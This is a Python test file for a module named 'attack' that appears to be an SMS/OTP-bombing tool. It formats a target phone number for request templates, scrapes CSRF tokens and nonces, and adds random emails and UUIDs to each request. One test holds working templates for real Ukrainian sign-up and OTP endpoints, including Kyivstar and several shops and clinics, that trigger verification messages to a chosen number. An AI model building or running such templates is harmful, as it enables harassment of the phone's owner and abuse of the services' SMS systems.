from __future__ import annotations

import asyncio
import random
import re

import pytest

import attack
from attack import CsrfSource, Template, TemplateError, build_job, build_jobs, csrf_token

RU = "79161234567"
UA = "380671234567"

def _tpl(**overrides) -> attack.Template:
    raw = {
        "name": "T",
        "country": "UA",
        "method": "POST",
        "url": "https://e.example/send",
        "body": '{"phone":"{{RAW}}"}',
    }
    raw.update(overrides)
    return Template.from_raw(raw)

def test_ua_formats_match_external_tool():
    table = attack.variants(UA)
    assert table["UASPACE"] == "+380 67 123 45 67"
    assert table["UAPAREN"] == "+38(067) 123 45 67"
    assert table["PLUS"] == "+380671234567"
    assert table["UALOCAL"] == "0671234567"
    assert table["FMTUA2"] == "+38(067)123-45-67"
    assert table["UA1"] == "+38 067 123 45 67"

def test_fill_tokens_replaces_only_given_values():
    text = "a={{UUID}}&b={{CSRF}}&c={{RAW}}"
    out = attack.fill_tokens(text, {"UUID": "u", "CSRF": "s"})
    assert out == "a=u&b=s&c={{RAW}}"

def test_uuid_token_is_allowed_and_resolved_per_job():
    tpl = _tpl(body='{"phone":"{{RAW}}","uuid":"{{UUID}}"}')
    job = build_job(tpl, attack.make_formatter(UA))
    assert job.needs_uuid is True
    assert "{{UUID}}" in job.body
    jobs, broken = build_jobs([tpl], attack.make_formatter(UA))
    assert broken == []
    assert len(jobs) == 1

def test_unknown_token_still_rejected():
    with pytest.raises(TemplateError, match="неизвестные токены"):
        _tpl(body='{"phone":"{{RAW}}","x":"{{NOPE}}"}')
    with pytest.raises(TemplateError, match="неизвестные токены"):
        _tpl(body='{"phone":"{{RAW}}","t":"{{CSRF}}"}')
    _tpl(body='{"phone":"{{RAW}}","uuid":"{{UUID}}"}')
    _tpl(
        body='{"phone":"{{RAW}}","t":"{{CSRF}}"}',
        csrf={"url": "https://e.example/form"},
    )

def test_random_email_shape_and_uniqueness():
    rng = random.Random(1)
    emails = {attack.random_email(rng) for _ in range(200)}
    assert len(emails) > 50
    for email in emails:
        local, _, domain = email.partition("@")
        assert domain in attack._EMAIL_DOMAINS
        assert local.replace(".", "").isalnum()

def test_email_token_allowed_and_resolved_per_job():
    tpl = _tpl(body='{"phone":"{{RAW}}","email":"{{EMAIL}}"}')
    job = build_job(tpl, attack.make_formatter(UA))
    assert "{{EMAIL}}" in job.email_probe_blob
    jobs, broken = build_jobs([tpl], attack.make_formatter(UA))
    assert broken == []

def test_broken_job_detected_for_unresolved_phone_token():
    tpl = _tpl(body='{"phone":"{{RU1}}"}')
    jobs, broken = build_jobs([tpl], attack.make_formatter(UA))
    assert broken == ["T"]
    assert jobs == []

def test_csrf_source_defaults_and_validation():
    tpl = _tpl(
        body='{"phone":"{{RAW}}","t":"{{CSRF}}"}',
        csrf={"url": "https://e.example/form", "ttl": 60},
    )
    assert tpl.csrf == CsrfSource(url="https://e.example/form", ttl=60.0)
    assert tpl.csrf.regex == attack._CSRF_DEFAULT_REGEX

    with pytest.raises(TemplateError, match="csrf"):
        _tpl(body='{"t":"{{CSRF}}"}', csrf={"url": "ftp://e"})
    with pytest.raises(TemplateError, match="regex"):
        _tpl(body='{"t":"{{CSRF}}"}', csrf={"url": "https://e/", "regex": "("})

def test_csrf_source_custom_headers():
    tpl = _tpl(
        body='{"t":"{{CSRF}}"}',
        csrf={
            "url": "https://api.example/csrf",
            "regex": '"token"\\s*:\\s*"([^"]+)"',
            "headers": {"x-analytics-clickid": "123", "x-mobile-app": "0"},
        },
    )
    assert tpl.csrf.headers == {"x-analytics-clickid": "123", "x-mobile-app": "0"}

def test_csrf_request_uses_custom_headers():
    source = CsrfSource(
        url="https://api.example/csrf",
        regex='"token"\\s*:\\s*"([^"]+)"',
        headers={"x-mobile-app": "0"},
    )
    seen: dict = {}

    class _Session:
        def get(self, url, headers=None, **kwargs):
            seen["url"] = url
            seen["headers"] = headers
            return _FakeResponse(200, '{"token":"tok123"}')

    token = asyncio.run(csrf_token(_Session(), source))
    assert token == "tok123"
    assert seen["headers"]["x-mobile-app"] == "0"
    assert seen["headers"]["User-Agent"] == attack._USER_AGENT

class _FakeResponse:
    def __init__(self, status: int, text: str) -> None:
        self.status = status
        self._text = text

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc) -> None:
        return None

    async def text(self, errors: str = "strict") -> str:
        return self._text

class _FakeSession:
    def __init__(self, status: int, text: str) -> None:
        self.status = status
        self.text = text
        self.calls = 0

    def get(self, url, **kwargs):
        self.calls += 1
        return _FakeResponse(self.status, self.text)

async def test_csrf_token_is_cached_per_session():
    source = CsrfSource(url="https://e.example/form", ttl=60)
    html = '<form><input type="hidden" name="_token" value="tok123"></form>'
    session = _FakeSession(200, html)

    assert await csrf_token(session, source) == "tok123"
    assert await csrf_token(session, source) == "tok123"
    assert session.calls == 1

    other = _FakeSession(200, '<input name="_token" value="tok999">')
    assert await csrf_token(other, source) == "tok999"

async def test_csrf_token_reports_missing_or_failed_page():
    source = CsrfSource(url="https://e.example/form")
    with pytest.raises(RuntimeError, match="токен не найден"):
        await csrf_token(_FakeSession(200, "<html>no form</html>"), source)
    with pytest.raises(RuntimeError, match="403"):
        await csrf_token(_FakeSession(403, ""), source)

def test_ua_templates_from_tool_are_valid():
    entries = [
        {
            "name": "MybizOTP",
            "country": "UA",
            "method": "POST",
            "url": "https://app.mybiz.com.ua/entry",
            "body": "_token={{CSRF}}&phone={{UASPACE}}&entry_otp_code="
            "&agree=on&serviceman_agree=on",
            "content_type": "application/x-www-form-urlencoded",
            "csrf": {
                "url": "https://app.mybiz.com.ua/entry",
                "regex": r'name="_token"\s+value="([^"]+)"',
                "ttl": 300,
            },
        },
        {
            "name": "KyivstarAccountOTP",
            "country": "UA",
            "method": "POST",
            "url": "https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk",
            "body": '{"action":"registration","captcha":null,"login":"{{UALOCAL}}"}',
            "content_type": "application/json",
        },
        {
            "name": "ProntoPizza",
            "country": "UA",
            "method": "POST",
            "url": "https://prontopizza.ua/wp-admin/admin-ajax.php",
            "body": "phone={{UALOCAL}}&action=register_user&nonce={{CSRF}}",
            "content_type": "application/x-www-form-urlencoded",
            "csrf": {
                "url": "https://prontopizza.ua/",
                "regex": r'"ajax_nonce"\s*:\s*"([^"]+)"',
            },
        },
        {
            "name": "Esculab",
            "country": "UA",
            "method": "POST",
            "url": "https://esculab.com/api/auth/authorise",
            "body": '{"phone":"{{PLUS}}","uuid":"{{UUID}}"}',
            "content_type": "application/json",
        },
    ]
    templates = attack.parse_templates(entries, strict=True)
    assert len(templates) == 4
    by_name = {t.name: t for t in templates}
    assert by_name["MybizOTP"].csrf is not None
    assert by_name["ProntoPizza"].csrf.regex == r'"ajax_nonce"\s*:\s*"([^"]+)"'

    formatters = {"UA": attack.make_formatter(UA)}
    jobs, broken = build_jobs(templates, formatters["UA"])
    assert broken == []
    assert len(jobs) == 4
    mybiz = next(j for j in jobs if j.name == "MybizOTP")
    assert mybiz.csrf is not None
    assert "{{CSRF}}" in mybiz.body
    assert "+380 67 123 45 67" in mybiz.body
    esculab = next(j for j in jobs if j.name == "Esculab")
    assert esculab.needs_uuid is True
    assert re.search(r"\{\{UUID\}\}", esculab.body)
